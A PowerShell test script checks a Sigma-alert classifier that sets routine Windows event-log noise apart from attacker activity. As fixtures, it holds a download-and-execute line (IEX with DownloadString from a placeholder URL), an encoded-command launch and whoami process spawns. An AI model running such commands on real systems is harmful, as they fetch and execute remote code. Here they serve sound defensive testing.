# Test v5.8: shape-based Sigma routine-noise classifier (Test-SigmaRoutineNoise)
# + report/verdict wiring pins. House style: extraction + stubs + Check().
$ErrorActionPreference = 'Stop'
$src = Get-Content (Join-Path $PSScriptRoot '..\Ophira.ps1') -Raw
$Check = { param($name, $ok) $script:n++; if ($ok) { $script:pass++; Write-Host "[PASS] $name" } else { $script:fail++; Write-Host "[FAIL] $name" } }
$script:n = 0; $script:pass = 0; $script:fail = 0

# ---- extract the classifier (column-0 brace; the C# regions have indented braces) ----
function Get-Fn { param([string]$name)
    $m = [regex]::Match($src, "(?s)function $name \{.*?\r?\n\}")
    if (-not $m.Success) { throw "extract $name failed" }
    return $m.Value
}
Invoke-Expression (Get-Fn 'Test-SigmaRoutineNoise')

function Row { param($eid, $details) [pscustomobject]@{ EventID = $eid; Details = $details; Level = 'med'; RuleTitle = 'R' } }

# P1: 5379 own-user vault read = routine
$mod = 'Posh-SSH module body ' * 60
& $Check '5379 own-user is routine' (Test-SigmaRoutineNoise (Row '5379' "PID: 33668 | SrcUser: jsmith | CredsReturned: 6 | SrcSID: S-1-5-21-3954351676-3366046813-382284764-1001"))
& $Check '5379 SYSTEM is NOT routine' (-not (Test-SigmaRoutineNoise (Row '5379' "PID: 900 | SrcUser: SYSTEM | CredsReturned: 2 | SrcSID: S-1-5-18")))
& $Check '5379 no src user is NOT routine' (-not (Test-SigmaRoutineNoise (Row '5379' 'PID: 900 | Tgt: machine account')))
# P2: 4104 module-code = routine
& $Check '4104 module manifest body is routine' (Test-SigmaRoutineNoise (Row '4104' "ScriptBlock: # Module manifest for module 'SSH' # RootModule = '' $mod [Parameter(ValueFromPipeline=`$true)] [bool] `$OthersCanWrite"))
& $Check '4104 PSScriptRoot+PSCmdlet body is routine' (Test-SigmaRoutineNoise (Row '4104' "ScriptBlock: if (`$PSScriptRoot) { Write-Verbose 'loading' } ; `$PSCmdlet.ThrowTerminatingError(`$_) $(('padding ' * 90))"))
& $Check '4104 single pattern + short is NOT routine' (-not (Test-SigmaRoutineNoise (Row '4104' 'ScriptBlock: if ($PSScriptRoot) { Write-Host hi }')))
# P3: attacker shapes never fold even with module-ish text
& $Check '4104 IEX downloader never folds' (-not (Test-SigmaRoutineNoise (Row '4104' "ScriptBlock: `$c = New-Object Net.WebClient; IEX (`$c.DownloadString('http://x/p.ps1')) ; Write-Verbose PSScriptRoot check $mod")))
& $Check '4104 enc/base64 never folds' (-not (Test-SigmaRoutineNoise (Row '4104' "ScriptBlock: powershell -enc SQBFAFgA $(('A' * 900)) [Parameter(`$true)]")))
& $Check '4104 process spawn never folds' (-not (Test-SigmaRoutineNoise (Row '4104' "ScriptBlock: Start-Process cmd '/c whoami' ; [Parameter(Mandatory=`$false)] `$x = 1 $mod")))
& $Check '4104 short attacker one-liner is NOT routine' (-not (Test-SigmaRoutineNoise (Row '4104' 'ScriptBlock: whoami /all')))
& $Check 'null row safe' (-not (Test-SigmaRoutineNoise $null))
& $Check 'non-matching EID safe' (-not (Test-SigmaRoutineNoise (Row '4688' 'whatever')))

# P4: wiring pins - all three pipelines + report transparency
& $Check 'glance coverage folds routine' ($src.Contains("if (Get-Command Test-SigmaRoutineNoise -ErrorAction SilentlyContinue) { `$flags = @(`$flags | Where-Object { -not (Test-SigmaRoutineNoise `$_) }) }"))
& $Check 'verdict pipeline folds routine' ($src.Contains("`$hay = @(`$hay | Where-Object { -not (Test-SigmaRoutineNoise `$_) })"))
& $Check 'report pipeline folds routine' ($src.Contains("`$routineFolds[`$rt7] = 1 + [int]`$routineFolds[`$rt7]"))
& $Check 'fold counted AFTER suppress.txt' ($src.IndexOf('$routineFolds = @{}') -gt $src.IndexOf('$sigmaSuppressed = @{}'))
& $Check 'report shows fold line' ($src.Contains('folded as routine shapes (v5.7 classifier'))
& $Check 'burst tag present' ($src.Contains('single context x'))
& $Check 'burst shrinks embed' ($src.Contains('$isBurst) { $take ='))
& $Check 'SharedFunctions has classifier' ($src.Contains("'Test-SigmaRoutineNoise'"))

# P5: suppression + fold lines both render in sigma section
& $Check 'suppress line still intact' ($src.Contains('hidden as routine noise (tools\sigma\suppress.txt'))

Write-Host ""
Write-Host ("v5.8 checks: {0}/{1} passed, {2} failed" -f $script:pass, $script:n, $script:fail)
if ($script:fail -gt 0) { exit 1 } else { exit 0 }
